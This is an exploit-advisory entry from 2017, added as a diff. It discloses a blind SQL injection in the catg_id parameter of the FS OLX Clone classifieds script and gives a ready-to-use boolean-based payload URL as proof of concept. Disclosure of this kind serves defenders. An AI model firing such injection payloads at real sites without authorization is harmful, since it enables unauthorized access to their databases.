@@ -1,0 +1,37 @@
+# Exploit Title: FS OLX Clone - SQL Injection
+# Date: 2017-10-23
+# Exploit Author: 8bitsec
+# Vendor Homepage: https://fortunescripts.com/
+# Software Link: https://fortunescripts.com/product/olx-clone/
+# Version: 23 October 17
+# Tested on: [Kali Linux 2.0 | Mac OS 10.12.6]
+# Email: contact@8bitsec.io
+# Contact: https://twitter.com/_8bitsec
+
+Release Date:
+=============
+2017-10-23
+
+Product & Service Introduction:
+===============================
+The best performing Classifieds software ever known.
+
+Technical Details & Description:
+================================
+
+SQL injection on [catg_id] parameter.
+
+Proof of Concept (PoC):
+=======================
+
+SQLi:
+
+https://localhost/[path]/search-result.php?searchbox=search&catg_id=5' AND 4453=4453 AND 'QlZa'='QlZa
+
+Parameter: catg_id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: searchbox=search&catg_id=5' AND 4453=4453 AND 'QlZa'='QlZa
+
+==================
+8bitsec - [https://twitter.com/_8bitsec]
